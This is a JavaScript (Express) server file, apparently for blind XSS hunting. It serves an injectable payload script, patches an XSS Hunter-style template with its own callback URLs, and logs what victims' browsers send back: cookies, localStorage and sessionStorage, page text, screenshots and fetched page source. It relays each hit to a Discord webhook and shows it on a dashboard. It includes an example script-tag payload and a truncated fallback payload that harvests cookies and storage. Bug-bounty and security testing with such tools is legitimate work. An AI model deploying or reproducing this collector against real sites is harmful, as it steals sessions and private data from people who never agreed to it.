import express from "express";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import multer from "multer";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 10000;
const publicBaseUrl = (process.env.PUBLIC_BASE_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`).replace(/\/$/, "");
const dataDir = process.env.DATA_DIR || __dirname;
fs.mkdirSync(dataDir, { recursive: true });
const logFile = path.join(dataDir, "callbacks.jsonl");
const dashboardUsername = process.env.DASHBOARD_USERNAME;
const dashboardPassword = process.env.DASHBOARD_PASSWORD;
const sessionSecret = process.env.SESSION_SECRET || dashboardPassword;
const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "";
const redisUrl = (process.env.UPSTASH_REDIS_REST_URL || "").replace(/\/+$/, "");
const redisToken = process.env.UPSTASH_REDIS_REST_TOKEN || "";
const redisKey = process.env.UPSTASH_REDIS_KEY || "xsstrace:callbacks";
const redisEnabled = Boolean(redisUrl && redisToken);
const failedLogins = new Map();

app.disable("x-powered-by");
app.set("trust proxy", true);

app.use(express.json({ limit: "10mb", type: ["application/json", "application/*+json", "text/plain"] }));
app.use(express.urlencoded({ extended: false, limit: "16kb" }));

app.get("/", (_req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/favicon.ico", (_req, res) => {
  res.sendFile(path.join(__dirname, "favicon.png"));
});

// Self-test page: loads a real payload in a browser so execution hits
// (cookies, DOM text, blurred screenshot) are actually generated.
app.get("/test", (req, res) => {
  const marker = String(req.query.marker || "test-page").replace(/[^a-zA-Z0-9._-]/g, "").slice(0, 64) || "test-page";
  res.set({
    "Cache-Control": "no-store, max-age=0",
    "X-Content-Type-Options": "nosniff"
  });
  res.type("html").send(buildTestPage(publicBaseUrl, marker));
});

app.get("/login", (req, res) => {
  setPrivatePageHeaders(res);
  const next = sanitizeLoginNext(req.query.next);
  if (isAuthenticated(req)) {
    res.redirect(next);
    return;
  }

  res.type("html").send(buildLoginPage(Boolean(req.query.error), undefined, next));
});

app.post("/login", (req, res) => {
  setPrivatePageHeaders(res);
  const next = sanitizeLoginNext(req.body.next);

  if (!dashboardUsername || !dashboardPassword || !sessionSecret) {
    res.status(500).type("html").send(buildLoginPage(true, "Dashboard credentials are not configured on the server.", next));
    return;
  }

  const ip = req.ip || "unknown";
  const attempts = failedLogins.get(ip) || { count: 0, resetAt: 0 };
  const now = Date.now();

  if (attempts.resetAt > now && attempts.count >= 8) {
    res.status(429).type("html").send(buildLoginPage(true, "Too many attempts. Try again shortly.", next));
    return;
  }

  if (!safeEqual(String(req.body.username || ""), dashboardUsername) ||
      !safeEqual(String(req.body.password || ""), dashboardPassword)) {
    failedLogins.set(ip, {
      count: attempts.resetAt > now ? attempts.count + 1 : 1,
      resetAt: now + 10 * 60 * 1000
    });
    res.redirect("/login?error=1&next=" + encodeURIComponent(next));
    return;
  }

  failedLogins.delete(ip);
  setAuthCookie(res);
  res.redirect(next);
});

app.post("/logout", (_req, res) => {
  setPrivatePageHeaders(res);
  res.setHeader("Set-Cookie", buildCookie("xssdash", "", { maxAge: 0 }));
  res.redirect("/login");
});

app.get("/dashboard", requireAuth, (_req, res) => {
  res.type("html").send(buildDashboard(publicBaseUrl));
});

app.get("/api/callbacks", requireAuth, (_req, res) => {
  res.json({
    callbacks: readCallbacks(null).reverse()
  });
});

app.post("/api/callbacks/clear", requireAuth, (_req, res) => {
  fs.writeFileSync(logFile, "", "utf8");
  void redisClear();
  res.json({ ok: true, callbacks: [] });
});

app.get("/api/callbacks/download", requireAuth, (_req, res) => {
  res.set({
    "Content-Type": "application/x-ndjson; charset=utf-8",
    "Content-Disposition": 'attachment; filename="callbacks.jsonl"'
  });

  if (!fs.existsSync(logFile)) {
    res.send("");
    return;
  }

  res.sendFile(logFile);
});

app.post("/api/callbacks/import", requireAuth, (req, res) => {
  const entries = Array.isArray(req.body.entries) ? req.body.entries.slice(0, 5000) : [];
  const normalized = entries.map(normalizeImportedEntry).filter(Boolean);

  if (normalized.length) {
    fs.appendFileSync(logFile, normalized.map((entry) => JSON.stringify(entry)).join("\n") + "\n", "utf8");
    void redisAppendMany(normalized);
  }

  res.json({ ok: true, imported: normalized.length, callbacks: readCallbacks(null).reverse() });
});

app.post("/api/callbacks/delete-page", requireAuth, (req, res) => {
  const pageKey = String(req.body.pageKey || "");
  const remaining = readCallbacks(null).filter((entry) => pageKeyForEntry(entry) !== pageKey);
  fs.writeFileSync(logFile, remaining.map((entry) => JSON.stringify(entry)).join("\n") + (remaining.length ? "\n" : ""), "utf8");
  void redisReplace(remaining);
  res.json({ ok: true, callbacks: remaining.slice().reverse() });
});

app.post("/api/callbacks/move-page", requireAuth, (req, res) => {
  const sourcePageKey = String(req.body.sourcePageKey || "");
  const targetPageKey = String(req.body.targetPageKey || "");

  if (!sourcePageKey || !targetPageKey || sourcePageKey === targetPageKey) {
    res.status(400).json({ error: "invalid_page_move" });
    return;
  }

  const updated = readCallbacks(null).map((entry) => {
    if (pageKeyForEntry(entry) !== sourcePageKey) {
      return entry;
    }

    return {
      ...entry,
      pageUrl: targetPageKey === "Unknown page" ? "" : targetPageKey,
      referrer: targetPageKey === "Unknown page" ? "" : entry.referrer
    };
  });

  fs.writeFileSync(logFile, updated.map((entry) => JSON.stringify(entry)).join("\n") + (updated.length ? "\n" : ""), "utf8");
  void redisReplace(updated);
  res.json({ ok: true, callbacks: updated.slice().reverse() });
});

app.get("/health", (_req, res) => {
  res.json({
    ok: true,
    publicBaseUrl,
    callbackCount: readCallbacks(null).length,
    authConfigured: Boolean(dashboardUsername && dashboardPassword && sessionSecret),
    hasDashboardUsername: Boolean(dashboardUsername),
    hasDashboardPassword: Boolean(dashboardPassword),
    hasSessionSecret: Boolean(sessionSecret)
  });
});

app.post("/callback", (req, res) => {
  const body = parseBody(req.body);
  writeCallback({
    ip: req.ip,
    marker: cleanString(body.marker),
    pageUrl: cleanString(body.pageUrl),
    referrer: cleanString(body.referrer),
    userAgent: cleanString(body.userAgent),
    language: cleanString(body.language),
    viewport: cleanString(body.viewport),
    title: cleanString(body.title),
    origin: cleanString(body.origin),
    windowName: cleanString(body.windowName),
    cookies: cleanString(body.cookies),
    localStorage: cleanLong(body.localStorage),
    sessionStorage: cleanLong(body.sessionStorage),
    domSnapshot: cleanImage(body.domSnapshot),
    source: "script"
  });

  res.status(204).end();
});

// Multer: parse multipart/form-data from bugatsec.js payload
// screenshot goes to memory (capped at 5 MB); all other fields go to req.body
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 10 * 1024 * 1024,   // 10 MB — screenshots can be large
    fieldSize: 2 * 1024 * 1024    // 2 MB — collected page HTML arrives as a text field
  }
});

// /js_callback — receives POSTs from bugatsec.js (XSS Hunter Express payload format)
// Field map:
//   uri           → pageUrl
//   referrer      → referrer
//   user-agent    → userAgent
//   browser-time  → (stored in windowName slot; no dedicated field in schema)
//   probe-uid     → marker
//   origin        → origin
//   injection_key → (ignored — always "bugatsec")
//   title         → title
//   cookies       → cookies
//   screenshot    → (file, stored as base64 in domSnapshot)
//   text          → (page text, stored in sessionStorage slot)
//   was_iframe    → (ignored)
//   secrets       → (stored in localStorage slot)
//   CORS          → (appended to windowName)
//   gitExposed    → (appended to windowName)
app.post("/js_callback", upload.single("screenshot"), (req, res) => {
  const b = req.body || {};

  // injection_key = user-named marker (e.g. "blind-xss") — this is what to show
  // probe-uid     = random UUID from get_guid() — keep for reference only
  const extras = [];
  const probeUid = b["probe-uid"] || "";
  if (probeUid) extras.push("probe-uid:" + probeUid);
  if (b["browser-time"]) extras.push("time:" + b["browser-time"]);
  if (b["CORS"] && b["CORS"] !== "false") extras.push("CORS:" + b["CORS"]);
  if (b["gitExposed"] && b["gitExposed"] !== "false") extras.push("git:" + b["gitExposed"]);

  // Screenshot: file buffer → base64 data URI (preserve the uploaded MIME type)
  let screenshotField = "";
  if (req.file && req.file.buffer && req.file.buffer.length) {
    const mime = /^image\//.test(req.file.mimetype || "") ? req.file.mimetype : "image/png";
    screenshotField = `data:${mime};base64,` + req.file.buffer.toString("base64");
  }

  writeCallback({
    ip: req.ip,
    marker: cleanString(b["injection_key"] || probeUid || "bugatsec"),
    pageUrl: cleanString(b["uri"] || ""),
    referrer: cleanString(b["referrer"] || ""),
    userAgent: cleanString(b["user-agent"] || ""),
    language: "",
    viewport: "",
    title: cleanString(b["title"] || ""),
    origin: cleanString(b["origin"] || ""),
    windowName: cleanString(extras.join(" | ")),
    cookies: cleanLong(b["cookies"] || ""),
    localStorage: cleanLong(b["secrets"] || ""),
    sessionStorage: cleanLong(b["text"] || ""),
    domSnapshot: cleanImage(screenshotField),
    source: "bugatsec-payload"
  });

  res.status(200).send("OK");
});

// /js_page_callback — receives page-source collection POSTs from bugatsec.js
// (send_collected_page). The default template ships with collect_page_list empty,
// so this only fires when that list is populated, but the endpoint must exist or
// those requests 404.
// Field map:
//   uri  → pageUrl (the page that was fetched)
//   html → fetched page source (stored as domSnapshot)
//   path → marker hint (payload always appends "bugatsec")
app.post("/js_page_callback", upload.none(), (req, res) => {
  const b = req.body || {};

  writeCallback({
    ip: req.ip,
    marker: cleanString(b["injection_key"] || b["path"] || "page-collect"),
    pageUrl: cleanString(b["uri"] || ""),
    referrer: cleanString(req.get("referer") || ""),
    userAgent: cleanString(req.get("user-agent") || ""),
    language: "",
    viewport: "",
    title: cleanString(b["title"] || ""),
    origin: cleanString(b["origin"] || ""),
    windowName: cleanString(b["injection_key"] ? "injection_key:" + b["injection_key"] : ""),
    cookies: cleanString(b["cookies"] || ""),
    localStorage: "",
    sessionStorage: "",
    domSnapshot: cleanHtml(b["html"] || ""),
    source: "bugatsec-page"
  });

  res.status(200).send("OK");
});

app.get("/i/:marker.gif", (req, res) => {
  writeCallback({
    ip: req.ip,
    marker: cleanString(req.params.marker),
    pageUrl: cleanString(req.query.u || req.query.url || ""),
    referrer: cleanString(req.query.r || req.get("referer") || ""),
    userAgent: cleanString(req.get("user-agent") || ""),
    language: cleanString(req.get("accept-language") || ""),
    viewport: "",
    source: "image"
  });

  res.set({
    "Content-Type": "image/gif",
    "Cache-Control": "no-store, max-age=0"
  });
  res.send(Buffer.from("R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==", "base64"));
});

// Cache the patched bugatsec.js template at startup (sync, once)
const bugatsecTemplatePath = path.join(__dirname, "bugatsec.js");
let bugatsecTemplate = null;
if (fs.existsSync(bugatsecTemplatePath)) {
  bugatsecTemplate = fs.readFileSync(bugatsecTemplatePath, "utf8");
}

app.get("/x/*", (req, res) => {
  const marker = markerFromPath(req.params[0]);

  // Collect every useful HTTP header available at script-fetch time
  // These are the ONLY things we can get before JS executes
  const referer    = cleanString(req.get("referer") || "");
  const ua         = cleanString(req.get("user-agent") || "");
  const lang       = cleanString(req.get("accept-language") || "");
  const xfwd       = cleanString(req.get("x-forwarded-for") || "");
  const cfIp       = cleanString(req.get("cf-connecting-ip") || "");  // Cloudflare real IP
  const secUa      = cleanString(req.get("sec-ch-ua") || "");          // e.g. "Chromium";v="124"
  const secUaPlatform = cleanString(req.get("sec-ch-ua-platform") || ""); // "Windows"
  const secUaMobile   = cleanString(req.get("sec-ch-ua-mobile") || "");   // ?0 or ?1
  const secFetchSite  = cleanString(req.get("sec-fetch-site") || "");  // cross-site / same-origin
  const secFetchDest  = cleanString(req.get("sec-fetch-dest") || "");  // script

  // Resolve best real IP: CF > X-Forwarded-For first entry > req.ip
  const realIp = cfIp || (xfwd ? xfwd.split(",")[0].trim() : "") || req.ip;

  // Pack extra header info into sessionStorage slot (repurposed for hit-1 header dump)
  const headerDump = [
    secUa         && `sec-ch-ua: ${secUa}`,
    secUaPlatform && `sec-ch-ua-platform: ${secUaPlatform}`,
    secUaMobile   && `sec-ch-ua-mobile: ${secUaMobile}`,
    secFetchSite  && `sec-fetch-site: ${secFetchSite}`,
    secFetchDest  && `sec-fetch-dest: ${secFetchDest}`,
    xfwd          && `x-forwarded-for: ${xfwd}`,
  ].filter(Boolean).join("\n");

  writeCallback({
    ip: realIp,
    marker,
    pageUrl: referer,   // Referer IS the page URL that contained the script tag
    referrer: "",
    userAgent: ua,
    language: lang,
    viewport: "",
    title: "",
    origin: "",
    windowName: "",
    cookies: "",
    localStorage: "",
    sessionStorage: headerDump,  // extra headers packed here for display
    domSnapshot: "",
    source: "payload-load"
  });

  res.set({
    "Content-Type": "application/javascript; charset=utf-8",
    "Cache-Control": "no-store, max-age=0",
    "X-Content-Type-Options": "nosniff"
  });

  if (bugatsecTemplate) {
    // Inject real server URLs and the named marker into the script at request time
    // Replace the injection_key assignment line specifically to preserve the marker name
    const patched = bugatsecTemplate
      .replace("XSSHUNTER_CALLBACK_URL", `${publicBaseUrl}/js_callback`)
      .replace("XSSHUNTER_PAGE_CALLBACK_URL", `${publicBaseUrl}/js_page_callback`)
      .replace(
        /probe_return_data\['injection_key'\]\s*=\s*"bugatsec";/,
        `probe_return_data['injection_key'] = ${JSON.stringify(marker)};`
      );
    res.send(patched);
  } else {
    // Fallback to built-in minimal payload if bugatsec.js is missing
    res.send(buildPayload(publicBaseUrl, req.params[0]));
  }
});

app.post("/x/*", captureRawBody, (req, res) => {
  writeCallback({
    ip: req.ip,
    marker: markerFromPath(req.params[0]),
    pageUrl: "",
    referrer: cleanString(req.get("referer") || ""),
    userAgent: cleanString(req.get("user-agent") || ""),
    language: cleanString(req.get("accept-language") || ""),
    viewport: "",
    rawBody: cleanBody(req.rawBody || ""),
    source: "payload-post"
  });

  res.status(204).end();
});

// Authenticated debug endpoint. Keep it behind the dashboard login so captured
// cookies, local storage, and other hit data are never exposed publicly.
app.get("/debug/status", requireAuth, (_req, res) => {
  const exists = fs.existsSync(logFile);
  let lines = [];
  let parseErrors = 0;
  if (exists) {
    const raw = fs.readFileSync(logFile, "utf8");
    const rawLines = raw.split(/\r?\n/).filter(Boolean);
    lines = rawLines.map((line) => {
      try {
        const e = JSON.parse(line);
        // Strip domSnapshot from debug output (too large)
        return { ...e, domSnapshot: e.domSnapshot ? `[${e.domSnapshot.length} chars]` : "" };
      } catch {
        parseErrors++;
        return { parseError: line.slice(0, 100) };
      }
    });
  }
  res.json({
    logFile,
    exists,
    lineCount: lines.length,
    parseErrors,
    last5: lines.slice(-5),
    env: {
      PUBLIC_BASE_URL: process.env.PUBLIC_BASE_URL || "(not set)",
      DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME ? "(set)" : "(not set)",
      DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD ? "(set)" : "(not set)",
      DISCORD_WEBHOOK_URL: process.env.DISCORD_WEBHOOK_URL ? "(set)" : "(not set)",
      UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL ? "(set)" : "(not set)",
      UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN ? "(set)" : "(not set)",
      DATA_DIR: process.env.DATA_DIR || "(not set, using __dirname)"
    }
  });
});

app.use((_req, res) => {
  res.status(404).type("text").send("Not found");
});

async function start() {
  await restoreFromRedis();
  app.listen(PORT, () => {
    console.log(`Blind XSS server listening on http://localhost:${PORT}`);
    console.log(`Example payload: <script src="${publicBaseUrl}/x/blind-xss"></script>`);
    console.log(redisEnabled
      ? "Persistence: Upstash Redis mirror enabled"
      : "Persistence: local file only (add UPSTASH_REDIS_REST_URL/TOKEN to survive restarts)");
  });
}

start();

function captureRawBody(req, res, next) {
  // If express.json()/express.urlencoded() already parsed a matching
  // Content-Type, reuse that instead of trying to read the stream again.
  if (req.body && typeof req.body === "object" && Object.keys(req.body).length) {
    req.rawBody = JSON.stringify(req.body);
    next();
    return;
  }
  if (typeof req.body === "string" && req.body.length) {
    req.rawBody = req.body;
    next();
    return;
  }

  // Otherwise (e.g. a PDF SubmitForm sending application/vnd.fdf, or any
  // other content type the global parsers ignore) read the raw bytes so we
  // can still log what was actually sent.
  let data = "";
  req.setEncoding("utf8");
  req.on("data", (chunk) => {
    data += chunk;
    if (data.length > 1_000_000) {
      req.destroy();
    }
  });
  req.on("end", () => {
    req.rawBody = data;
    next();
  });
  req.on("error", () => {
    req.rawBody = "";
    next();
  });
}

function cleanString(value) {
  if (typeof value !== "string") {
    return "";
  }

  return value.slice(0, 2000);
}

// For larger fields: cookies, storage, DOM text
function cleanLong(value) {
  if (typeof value !== "string") {
    return "";
  }

  return value.slice(0, 10000);
}

// For screenshots / base64 images. multer caps uploads at 10 MB, which inflates
// to ~13.98M base64 chars. Keep the ceiling above that so a full screenshot is
// stored intact — cutting base64 short leaves the dashboard <img> with an
// invalid data URI and a broken image.
function cleanImage(value) {
  if (typeof value !== "string") {
    return "";
  }

  const MAX_IMAGE_CHARS = 14_000_000;
  return value.length > MAX_IMAGE_CHARS ? "" : value;
}

// For raw request bodies captured on /x/* (captureRawBody caps at ~1 MB)
function cleanBody(value) {
  if (typeof value !== "string") {
    return "";
  }

  return value.slice(0, 1_000_000);
}

// For collected page source (bugatsec.js /js_page_callback)
function cleanHtml(value) {
  if (typeof value !== "string") {
    return "";
  }

  return value.slice(0, 200_000);
}

function requireAuth(req, res, next) {
  setPrivatePageHeaders(res);
  if (isAuthenticated(req)) {
    next();
    return;
  }

  if (req.path.startsWith("/api/")) {
    res.status(401).json({ error: "auth_required" });
    return;
  }

  // Preserve the client-side #hash (e.g. #hit=... from a Discord link) by
  // letting the browser forward it into the login `next` parameter.
  res.status(401).type("html").send(buildLoginRedirectPage());
}

function sanitizeLoginNext(value) {
  const next = String(value || "");
  return /^\/dashboard(#[^\s]*)?$/.test(next) ? next : "/dashboard";
}

function buildLoginRedirectPage() {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login required</title>
</head>
<body>
  <script>
    location.replace("/login?next=" + encodeURIComponent("/dashboard" + location.hash));
  </script>
  <noscript><meta http-equiv="refresh" content="0;url=/login"></noscript>
</body>
</html>`;
}

function setPrivatePageHeaders(res) {
  res.set({
    "Cache-Control": "no-store, max-age=0",
    "Pragma": "no-cache",
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "no-referrer"
  });
}

function isAuthenticated(req) {
  if (!dashboardUsername || !dashboardPassword || !sessionSecret) {
    return false;
  }

  const cookies = parseCookies(req.get("cookie") || "");
  const token = cookies.xssdash;
  if (!token) {
    return false;
  }

  const [payload, signature] = token.split(".");
  if (!payload || !signature) {
    return false;
  }

  const expected = signValue(payload);
  if (!safeEqual(signature, expected)) {
    return false;
  }

  try {
    const session = JSON.parse(Buffer.from(payload, "base64url").toString("utf8"));
    return Number(session.exp) > Date.now();
  } catch {
    return false;
  }
}

function setAuthCookie(res) {
  const payload = Buffer.from(JSON.stringify({
    exp: Date.now() + 12 * 60 * 60 * 1000,
    nonce: crypto.randomBytes(16).toString("hex")
  })).toString("base64url");
  res.setHeader("Set-Cookie", buildCookie("xssdash", `${payload}.${signValue(payload)}`, { maxAge: 12 * 60 * 60 }));
}

function buildCookie(name, value, options = {}) {
  const parts = [
    `${name}=${encodeURIComponent(value)}`,
    "Path=/",
    "HttpOnly",
    "SameSite=Lax"
  ];

  if (options.maxAge !== undefined) {
    parts.push(`Max-Age=${options.maxAge}`);
  }

  if (process.env.NODE_ENV === "production" || publicBaseUrl.startsWith("https://")) {
    parts.push("Secure");
  }

  return parts.join("; ");
}

function parseCookies(header) {
  return header.split(";").reduce((cookies, part) => {
    const index = part.indexOf("=");
    if (index === -1) {
      return cookies;
    }

    const key = part.slice(0, index).trim();
    const value = part.slice(index + 1).trim();
    cookies[key] = decodeURIComponent(value);
    return cookies;
  }, {});
}

function signValue(value) {
  return crypto.createHmac("sha256", sessionSecret).update(value).digest("base64url");
}

function safeEqual(left, right) {
  const leftBuffer = Buffer.from(String(left));
  const rightBuffer = Buffer.from(String(right));
  if (leftBuffer.length !== rightBuffer.length) {
    return false;
  }

  return crypto.timingSafeEqual(leftBuffer, rightBuffer);
}

function parseBody(body) {
  if (typeof body === "string") {
    try {
      return JSON.parse(body);
    } catch {
      return {};
    }
  }

  if (body && typeof body === "object") {
    return body;
  }

  return {};
}

function writeCallback(entry) {
  const normalized = {
    receivedAt: new Date().toISOString(),
    ip: entry.ip || "",
    marker: entry.marker || "unknown",
    pageUrl: entry.pageUrl || "",
    referrer: entry.referrer || "",
    userAgent: entry.userAgent || "",
    language: entry.language || "",
    viewport: entry.viewport || "",
    title: entry.title || "",
    origin: entry.origin || "",
    windowName: entry.windowName || "",
    cookies: entry.cookies || "",
    localStorage: entry.localStorage || "",
    sessionStorage: entry.sessionStorage || "",
    domSnapshot: entry.domSnapshot || "",
    rawBody: entry.rawBody || "",
    source: entry.source || "unknown"
  };

  fs.appendFileSync(logFile, `${JSON.stringify(normalized)}\n`, "utf8");
  console.log("Blind XSS callback:", normalized);
  void redisAppend(normalized);
  notifyDiscord(normalized);
}

// Discord embed field values are capped at 1024 chars each.
const DISCORD_FIELD_LIMIT = 1024;

// User agents to silently ignore — no Discord alert will be sent for these.
const IGNORED_USER_AGENTS = [
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
];

function notifyDiscord(entry) {
  if (!discordWebhookUrl) {
    return;
  }

  // Skip Discord notification if the hit came from an ignored crawler/bot UA.
  const ua = (entry.userAgent || "").trim();
  if (IGNORED_USER_AGENTS.some((ignored) => ua.toLowerCase() === ignored.toLowerCase())) {
    return;
  }

  const page = entry.pageUrl || entry.referrer || "Unknown page";
  const hitId = entry.receivedAt ? entry.receivedAt.replace(/[^a-zA-Z0-9]/g, "-") : "latest";
  const dashboardField = { name: "Open in dashboard", value: `${publicBaseUrl}/dashboard#hit=${hitId}`, inline: false };
  const baseFields = [
    { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
    { name: "Source", value: truncateDiscord(entry.source), inline: true },
    { name: "IP", value: truncateDiscord(entry.ip || "Unknown"), inline: true },
    { name: "Page", value: truncateDiscord(page), inline: false },
    { name: "User Agent", value: truncateDiscord(entry.userAgent || "Unknown"), inline: false }
  ];

  const rawBody = String(entry.rawBody || "");
  const cookies = String(entry.cookies || "");
  const localStorage = String(entry.localStorage || "");
  const sessionStorage = String(entry.sessionStorage || "");
  const title = String(entry.title || "");
  const windowName = String(entry.windowName || "");

  // Wrap data fields in code blocks so they're distinguishable in Discord
  function codeBlock(v) { return "```\n" + v.slice(0, 990) + "\n```"; }

  const extraFields = [];
  if (title) extraFields.push({ name: "📄 Page Title", value: truncateDiscord(title), inline: true });
  if (windowName) extraFields.push({ name: "🪟 window.name", value: codeBlock(windowName), inline: false });
  if (cookies) extraFields.push({ name: "🍪 Cookies", value: codeBlock(cookies), inline: false });
  if (localStorage) extraFields.push({ name: "💾 localStorage", value: codeBlock(localStorage), inline: false });
  const sessionStorageLabel = entry.source === "payload-load" ? "📋 Request Headers" : "💾 sessionStorage";
  if (sessionStorage) extraFields.push({ name: sessionStorageLabel, value: codeBlock(sessionStorage), inline: false });

  const screenshot = parseScreenshotDataUrl(entry.domSnapshot);

  if (!rawBody) {
    sendDiscordEmbed([...baseFields, ...extraFields, dashboardField], entry.receivedAt, "New Blind XSS Hit", screenshot);
    return;
  }

  if (rawBody.length <= DISCORD_FIELD_LIMIT) {
    sendDiscordEmbed(
      [...baseFields, ...extraFields, { name: "Body", value: rawBody, inline: false }, dashboardField],
      entry.receivedAt,
      "New Blind XSS Hit",
      screenshot
    );
    return;
  }

  // Body doesn't fit in a single field/message — send it across two messages
  // instead of silently truncating it.
  const firstHalf = rawBody.slice(0, DISCORD_FIELD_LIMIT);
  const secondHalf = rawBody.slice(DISCORD_FIELD_LIMIT, DISCORD_FIELD_LIMIT * 2);

  sendDiscordEmbed(
    [...baseFields, ...extraFields, { name: "Body (1/2)", value: firstHalf, inline: false }],
    entry.receivedAt,
    "New Blind XSS Hit",
    screenshot
  );

  sendDiscordEmbed(
    [
      { name: "Marker", value: truncateDiscord(entry.marker), inline: true },
      { name: "Body (2/2)", value: truncateDiscord(secondHalf), inline: false },
      dashboardField
    ],
    entry.receivedAt,
    "New Blind XSS Hit (continued)"
  );
}

// Parse a data:image/... URL into a webhook attachment. Returns null when the
// hit has no image (payload-load hits), the data is too large, or decoding fails.
function parseScreenshotDataUrl(value) {
  const match = /^data:(image\/[a-z0-9.+-]+);base64,(.*)$/i.exec(String(value || ""));
  if (!match || match[2].length > 6_500_000) {
    return null;
  }

  const mime = match[1].toLowerCase();
  const buffer = Buffer.from(match[2], "base64");
  if (!buffer.length) {
    return null;
  }

  const ext = mime === "image/jpeg" ? "jpg"
    : mime === "image/webp" ? "webp"
    : mime === "image/gif" ? "gif"
    : "png";

  return { buffer, mime, filename: `xsstrace-hit.${ext}` };
}

function sendDiscordEmbed(fields, timestamp, title, screenshot = null) {
  const embed = {
    title,
    color: 2140567,
    timestamp,
    fields
  };

  if (screenshot) {
    embed.image = { url: `attachment://${screenshot.filename}` };
  }

  const payload = {
    username: "Blind XSS Monitor",
    embeds: [embed]
  };

  if (!screenshot) {
    fetch(discordWebhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch((error) => {
      console.error("Discord notification failed:", error.message);
    });
    return;
  }

  const form = new FormData();
  form.append("payload_json", JSON.stringify(payload));
  form.append(
    "files[0]",
    new Blob([screenshot.buffer], { type: screenshot.mime }),
    screenshot.filename
  );

  fetch(discordWebhookUrl, {
    method: "POST",
    body: form
  }).catch((error) => {
    console.error("Discord notification failed:", error.message);
  });
}

function truncateDiscord(value) {
  const text = String(value || "");
  return text.length > 1000 ? `${text.slice(0, 997)}...` : text;
}

function normalizeImportedEntry(entry) {
  if (!entry || typeof entry !== "object") {
    return null;
  }

  const receivedAt = cleanString(entry.receivedAt);
  return {
    receivedAt: Number.isNaN(new Date(receivedAt).getTime()) ? new Date().toISOString() : receivedAt,
    ip: cleanString(entry.ip),
    marker: cleanString(entry.marker) || "unknown",
    pageUrl: cleanString(entry.pageUrl),
    referrer: cleanString(entry.referrer),
    userAgent: cleanString(entry.userAgent),
    language: cleanString(entry.language),
    viewport: cleanString(entry.viewport),
    title: cleanString(entry.title),
    origin: cleanString(entry.origin),
    windowName: cleanString(entry.windowName),
    cookies: cleanLong(entry.cookies),
    localStorage: cleanLong(entry.localStorage),
    sessionStorage: cleanLong(entry.sessionStorage),
    domSnapshot: cleanImage(entry.domSnapshot),
    rawBody: cleanBody(entry.rawBody),
    source: cleanString(entry.source) || "import"
  };
}

function buildTestPage(baseUrl, marker) {
  const payloadUrl = `${baseUrl}/x/${encodeURIComponent(marker)}`;

  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>XSSTrace Test Page</title>
  <style>
    :root { color-scheme: dark; }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      background: #101214;
      color: #edf2f7;
      font: 15px/1.6 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }
    main {
      width: min(720px, 100%);
      background: #171b1f;
      border: 1px solid #303941;
      border-radius: 8px;
      padding: 28px;
    }
    h1 { margin: 0 0 12px; font-size: 24px; }
    p { color: #9aa7b2; }
    code { background: #0b0d0f; border: 1px solid #303941; border-radius: 4px; padding: 1px 5px; color: #20c997; }
    #status { color: #f7b955; }
  </style>
</head>
<body>
  <main>
    <h1>XSSTrace Test Page</h1>
    <p>This page executes a real payload with marker <code>${escapeHtml(marker)}</code>.</p>
    <p>It sets a cookie, localStorage and sessionStorage, then loads the payload so the dashboard receives an <strong>execution hit</strong> with cookies and a screenshot.</p>
    <p id="status">Running payload…</p>
    <p><a href="${escapeHtml(baseUrl)}/dashboard" style="color:#20c997">Open dashboard</a></p>
  </main>
  <script>
    document.cookie = "xsstest_cookie=hello-from-test-page; path=/";
    localStorage.setItem("xsstest_local", "local-storage-value");
    sessionStorage.setItem("xsstest_session", "session-storage-value");
  </script>
  <script src="${escapeHtml(payloadUrl)}"></script>
  <script>
    setTimeout(function () {
      document.getElementById("status").textContent =
        "Payload loaded. The dashboard should show the hit within a few seconds (source: bugatsec-payload).";
    }, 2000);
  </script>
</body>
</html>`;
}

function buildPayload(baseUrl, markerPath) {
  const callbackUrl = JSON.stringify(`${baseUrl}/callback`);
  const imageBaseUrl = JSON.stringify(`${baseUrl}/i/`);
  const marker = JSON.stringify(markerFromPath(markerPath));

  return `(() => {
  "use strict";

  function safeGet(fn) {
    try { return fn(); } catch (_) { return ""; }
  }

  function truncate(s, n) {
    return String(s || "").slice(0, n);
  }

  // Collect cookies
  const cookies = safeGet(() => document.cookie) || "";

  // Collect localStorage (keys + values, truncated to 4000 chars total)
  let localStorageData = "";
  try {
    const ls = {};
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      ls[k] = localStorage.getItem(k);
    }
    localStorageData = truncate(JSON.stringify(ls), 4000);
  } catch (_) {}

  // Collect sessionStorage
  let sessionStorageData = "";
  try {
    const ss = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      ss[k] = sessionStorage.getItem(k);
    }
    sessionStorageData = truncate(JSON.stringify(ss), 4000);
  } catch (_) {}

  // DOM snapshot - outer HTML truncated to 8000 chars
  const domSnapshot = safeGet(() => truncate(document.documentElement.outerHTML, 8000));

  const payload = {
    marker: ${marker},
    pageUrl: String(location.href),
    referrer: String(document.referrer || ""),
    userAgent: String(navigator.userAgent || ""),
